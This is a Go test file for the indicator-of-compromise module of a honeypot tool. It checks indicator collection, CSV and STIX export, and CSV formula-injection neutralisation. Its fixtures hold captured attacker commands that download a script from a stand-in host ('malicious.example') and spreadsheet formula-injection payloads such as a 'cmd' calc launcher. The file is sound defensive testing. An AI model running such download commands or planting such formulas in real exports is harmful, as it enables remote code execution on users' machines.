package ioc

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestCollect(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	events := []*models.Event{
		{TS: t0, Source: models.SourceCowrie, Kind: models.KindCommand,
			SrcIP: "1.2.3.4", Username: "root", ActorID: "cowrie:abc",
			Command: "curl http://malicious.example/x.sh -o /tmp/x"},
		{TS: t0.Add(time.Minute), Source: models.SourceCowrie, Kind: models.KindCommand,
			SrcIP: "1.2.3.4", Username: "root", ActorID: "cowrie:abc",
			Command: "wget http://malicious.example/x.sh"},
		{TS: t0.Add(2 * time.Minute), Source: models.SourceCowrie, Kind: "file_download",
			SrcIP: "1.2.3.4", ActorID: "cowrie:abc",
			SHA256: "deadbeef"},
		{TS: t0.Add(3 * time.Minute), Source: models.SourceJournal, Kind: models.KindFailedPass,
			SrcIP: "5.6.7.8", Username: "admin", ActorID: "journal:5.6.7.8"},
	}
	got := Collect(events, nil)

	// expectations: 2 IPs, 1 hash, 1 URL (deduped), 2 users
	count := map[Kind]int{}
	for _, ind := range got {
		count[ind.Kind]++
	}
	if count[KindIP] != 2 {
		t.Errorf("KindIP=%d want 2", count[KindIP])
	}
	if count[KindHash] != 1 {
		t.Errorf("KindHash=%d want 1", count[KindHash])
	}
	if count[KindURL] != 1 {
		t.Errorf("KindURL=%d want 1 (deduped)", count[KindURL])
	}
	if count[KindUser] != 2 {
		t.Errorf("KindUser=%d want 2", count[KindUser])
	}

	// the dominant IP should be 1.2.3.4 (3 events) before 5.6.7.8
	var ips []Indicator
	for _, ind := range got {
		if ind.Kind == KindIP {
			ips = append(ips, ind)
		}
	}
	if ips[0].Value != "1.2.3.4" || ips[0].Count != 3 {
		t.Errorf("top IP=%v count=%d want 1.2.3.4/3", ips[0].Value, ips[0].Count)
	}
}

func TestWriteCSV(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3,
			Sources: []string{"cowrie"}, Actors: []string{"abc"}, SampleCommand: "uname -a"},
	}
	var buf bytes.Buffer
	if err := WriteCSV(&buf, indicators); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "kind,value,first_seen") {
		t.Errorf("missing header: %q", out)
	}
	if !strings.Contains(out, "ip,1.2.3.4") {
		t.Errorf("missing IP row: %q", out)
	}
}

func TestWriteSTIX(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3,
			Sources: []string{"cowrie"}, Actors: []string{"abc"}},
		{Kind: KindHash, Value: "deadbeef", FirstSeen: t0, LastSeen: t0, Count: 1},
		{Kind: KindURL, Value: "http://x.example/", FirstSeen: t0, LastSeen: t0, Count: 1},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0, Count: 5},
	}
	var buf bytes.Buffer
	if err := WriteSTIX(&buf, indicators); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	mustHave := []string{
		`"type": "bundle"`,
		`"spec_version": "2.1"`,
		`"type": "identity"`,
		`"type": "indicator"`,
		"[ipv4-addr:value = '1.2.3.4']",
		"[file:hashes.'SHA-256' = 'deadbeef']",
		"[url:value = 'http://x.example/']",
		"[user-account:account_login = 'root']",
	}
	for _, want := range mustHave {
		if !strings.Contains(out, want) {
			t.Errorf("STIX missing %q", want)
		}
	}
}

// TestWriteSTIXDeterministic confirms two successive exports of the
// same indicator set produce byte-identical JSON. Regression guard
// for Fix #9 (replacing time.Now() in WriteSTIX with stable
// indicator-derived timestamps).
func TestWriteSTIXDeterministic(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0.Add(time.Hour), Count: 3, Sources: []string{"cowrie"}},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0.Add(2 * time.Hour), Count: 5, Sources: []string{"cowrie"}},
	}
	var a, b bytes.Buffer
	if err := WriteSTIX(&a, indicators); err != nil {
		t.Fatalf("first export: %v", err)
	}
	// Sleep across at least one second to prove we're not implicitly
	// hashing the wall clock.
	time.Sleep(1100 * time.Millisecond)
	if err := WriteSTIX(&b, indicators); err != nil {
		t.Fatalf("second export: %v", err)
	}
	if !bytes.Equal(a.Bytes(), b.Bytes()) {
		t.Errorf("STIX export not deterministic:\n--- A ---\n%s\n--- B ---\n%s", a.String(), b.String())
	}
}

// TestWriteCSVNeutralizesFormulaInjection locks in the CWE-1236 fix: a captured
// username/command beginning with =,+,-,@ (attacker-controlled) must not be
// emitted as a live spreadsheet formula.
func TestWriteCSVNeutralizesFormulaInjection(t *testing.T) {
	now := time.Now()
	inds := []Indicator{
		{Kind: "user", Value: "=cmd|' /c calc'!A1", FirstSeen: now, LastSeen: now, Count: 1},
		{Kind: "user", Value: "+1+1", FirstSeen: now, LastSeen: now, Count: 1},
		{Kind: "ip", Value: "1.2.3.4", FirstSeen: now, LastSeen: now, Count: 1, SampleCommand: "@SUM(1+9)*cmd"},
		{Kind: "ip", Value: "5.6.7.8", FirstSeen: now, LastSeen: now, Count: 1, SampleCommand: "uname -a"},
	}
	var buf bytes.Buffer
	if err := WriteCSV(&buf, inds); err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}
	out := buf.String()
	for _, danger := range []string{"=cmd", "+1+1", "@SUM"} {
		// The dangerous lead must be apostrophe-prefixed, never bare at a cell start.
		if strings.Contains(out, ",'"+danger) || strings.Contains(out, "'"+danger) {
			continue
		}
		t.Errorf("formula lead %q not neutralized in CSV:\n%s", danger, out)
	}
	// A benign value/command must pass through unchanged.
	if !strings.Contains(out, "1.2.3.4") || !strings.Contains(out, "uname -a") {
		t.Errorf("benign fields altered:\n%s", out)
	}
	// Sanity: csvSafe leaves normal text alone, prefixes dangerous leads.
	if csvSafe("root") != "root" || csvSafe("=evil") != "'=evil" {
		t.Errorf("csvSafe wrong: %q %q", csvSafe("root"), csvSafe("=evil"))
	}
}
